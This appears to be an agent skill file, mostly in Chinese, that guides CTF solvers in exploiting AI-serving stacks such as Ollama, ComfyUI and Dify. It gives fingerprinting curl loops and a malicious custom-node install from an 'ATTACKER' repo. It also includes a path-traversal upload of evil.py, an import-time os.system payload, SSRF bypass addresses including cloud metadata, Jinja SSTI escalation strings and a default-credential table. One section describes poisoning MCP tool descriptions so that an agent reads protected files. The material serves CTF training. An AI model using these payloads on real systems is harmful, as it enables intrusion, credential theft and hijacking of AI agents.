---
name: ctf-ai-infra
description: Exploiting AI infrastructure and LLM agent frameworks themselves, not the models. Use when the target exposes an AI-serving stack (Ollama, ComfyUI, Gradio, Dify, n8n, Langflow, RAGFlow, vLLM, Open WebUI, LiteLLM), an MCP server, a vector database, or an agent/builder UI, and the goal is finding or exploiting implementation vulnerabilities such as SSRF, path traversal, RCE via template/model loading, auth bypass, prompt/tool injection, or credential leakage. Do not use it for attacking the ML model itself (adversarial examples, membership inference, data poisoning) — that is ctf-ai-ml. Do not use it for generic web bugs on a non-AI site.
license: MIT
compatibility: Requires filesystem-based agent with bash and Python 3. The bundled CVE rules and fingerprint data are offline; no internet needed at solve time.
allowed-tools: Bash Read Write Edit Glob Grep
metadata:
  user-invocable: "false"
  origin: 本仓库自建，填补 ctf-ai-ml 未覆盖的 AI 基础设施方向
---

# AI Infrastructure & Agent Framework Security

TPCTF 与京华杯的"AI 安全"命题定义是 **AI 开源框架及智能体相关漏洞的挖掘与利用**——考的是 AI 服务的**实现漏洞**，不是模型本身的对抗攻击。本技能只覆盖前者，后者见 `ctf-ai-ml`。

## 与 ctf-ai-ml 的分界

| 题目在问什么 | 用哪个技能 |
|---|---|
| 服务的接口、鉴权、文件读写、模板渲染有漏洞 | **本技能** |
| MCP 工具被投毒、agent 被诱导执行越权操作 | **本技能** |
| 模型权重被篡改、对抗样本、成员推断 | `ctf-ai-ml` |

## 第一步：识别组件（不要先猜端口）

AI 服务常跑在非常规端口，**按端口猜会漏**。正确顺序是先看响应特征，再查指纹。

```bash
# 一次性探测常见特征路径；失败即跳过，不要纠缠
for p in / /api/version /v1/models /system_stats /api/tags /health /api/config; do
  code=$(curl -s -o /tmp/r.$$ -w '%{http_code}' --max-time 4 "http://$T$p")
  echo "== $p [$code] $(head -c 120 /tmp/r.$$ | tr -d '\n')"
done
```

**关键识别特征**（命中即定型）：

| 组件 | 决定性特征 |
|---|---|
| Ollama | `GET /api/version` → `{"version":"x.y.z"}`（紧凑 JSON，无空格） |
| ComfyUI | `GET /system_stats` → 含 `comfyui_version`；首页有 `__COMFYUI_FRONTEND_VERSION__` |
| Gradio | 首页含 `gradio_config` 或 `/config` 返回带 `dependencies` 的 JSON |
| Dify | 响应头带 `X-Version`；`/console/api/setup` 存在 |
| Open WebUI | `/api/config` → 含 `features`；`/api/v1/auths` |
| vLLM | `/v1/models` 返回 OpenAI 兼容列表，`/metrics` 暴露引擎指标 |
| LiteLLM | `/health` 或 `/v1/models`，路径含 `litellm` |

有本地规则库时（`aisec/` 目录）优先走工具，别手写：

```bash
python3 aisec/aig_tool.py scan http://TARGET:PORT     # 指纹 + CVE 一次出
```

## 第二步：按组件查已知 CVE

拿到**确切版本**再查。版本常在响应头或专用接口里，不在首页。

```bash
python3 aisec/aig_tool.py lookup ollama 0.1.29    # 27 条，含 CVE-2024-7773
python3 aisec/aig_tool.py lookup dify 0.6.9       # 25 条
python3 aisec/aig_tool.py lookup comfyui 0.3.27   # 9 条
```

**先看 severity 和是否有 HTTP PoC，再决定要不要花时间。** 版本号取不到时（出题人改过 banner），退回第三步的思路题。

## 第三步：思路型漏洞（没有 CVE 可查时）

这些是 AI 栈的**结构性问题**，即使版本最新也存在。按命中率排序：

### 1. 自定义节点 / 插件加载 → RCE（最常考）

ComfyUI、Gradio、Langflow、Dify、n8n 都有"装插件"入口。只要能把文件写进插件目录，就是 RCE。

```bash
# ComfyUI：装自定义节点
curl -s "http://$T/api/customnode/install" -H 'Content-Type: application/json' \
  -d '{"repository":"https://github.com/ATTACKER/evil-node"}'

# Gradio / 有文件上传的：先确认写到哪里，再找目录穿越
curl -s -F "files=@evil.py;filename=../../custom_nodes/evil.py" "http://$T/upload"
```

要构造 payload 时，写一个最小的 `__init__.py`，在 import 期执行命令——**别依赖 web 路由触发**，服务可能不暴露那个路由：

```python
import os  # NODE_CLASS_MAPPINGS 必须存在，否则加载器会拒绝
os.system("cat /flag > /tmp/out")  # 或者直接回连
NODE_CLASS_MAPPINGS = {}
```

### 2. 模型 / 适配器路径穿越

加载模型、LoRA、GGUF 时的路径参数：`path`、`model_path`、`lora_name`、`ckpt_name`。
试 `../../..`、绝对路径、`file://`。写文件同理（下载模型到指定目录）。

### 3. SSRF：Webhook / 远程拉取 / 模型 URL

几乎所有 AI 编排工具都能"从 URL 拉模型或数据"。指向 `http://127.0.0.1:PORT`、`file://`、
云元数据 `http://169.254.169.254/`。**注意有些框架会拒绝私网地址——先用 localhost 变体试探**
（`http://0.0.0.0`、`http://[::1]`、十进制 IP `http://2130706433`）。

### 4. 模板 / Prompt 注入落到代码执行

Dify、Langflow、Flowise 的工作流里有代码节点、表达式节点（Jinja、Python）。
找到"用户可控输入 → 模板渲染"的路径，直接 `{{ 7*7 }}` 试探，再升级到
`{{ ''.__class__.__mro__[1].__subclasses__() }}`（Jinja）或等价物。

### 5. MCP / 工具调用投毒

agent 读取外部内容（网页、文件、工具返回值）时，注入指令让它调用危险工具。
题目形式通常是"让 agent 读出某个文件/执行某个操作"。

- 把恶意指令藏在 **工具描述**、**MCP server 的 tools/list 返回**、**被读取的文档**里
- 关键是看 agent 是否有"读了就照做"的路径（无人工确认的 tool 调用）
- 出题常把 flag 放在 agent 有权限读、你没有的文件里

### 6. 认证缺失与默认凭据

大量 AI 工具**默认无鉴权**且绑 `0.0.0.0`。先直连试，再试默认账号：

| 组件 | 默认 |
|---|---|
| Ollama / ComfyUI | 无鉴权 |
| Dify / n8n / Langflow | 首次访问走 setup 页，**未 setup 时任何人都能创建管理员** |
| Open WebUI | 首个注册用户成为 admin |
| Jupyter（常被一起打包） | `token` 在启动日志 / `/api` 无鉴权时直接开 shell |

### 7. 向量库与嵌入接口

Chroma / Qdrant / Milvus / Weaviate 常无鉴权，且支持 `/collections/{name}/points` 直接读写。
题目会把 flag 藏在向量库的 payload 里。

## 常见坑

- **版本号取不到不代表没漏洞**。很多题删了 `/api/version`，但漏洞还在，直接按第三步思路打。
- **不要对 AI 服务跑通用扫描器**。32000 端口段、WebSocket 端点会让 nuclei 之类误报满天飞，
  反而淹没真正的线索。
- **别把"模型说不该做什么"当结论**。这道题的 flag 在服务端文件里，不在模型的回答里。
- **Ollama 的 `/api/pull` 能拉任意 registry 的模型**，配合恶意 registry 可以做延迟触发（CVE-2024-7773 就是这条链）。

## 判定是否值得继续

- 找到确切版本 + 命中 CVE + 有 PoC → 直接打，通常 10 分钟内出结果
- 只能识别组件、查不到 CVE → 转思路题，重点看**安装/上传/URL 拉取**三类入口
- 完全识别不出组件 → 退回通用 Web 技能（`ctf-web/ctf-web`），别在指纹上死磕
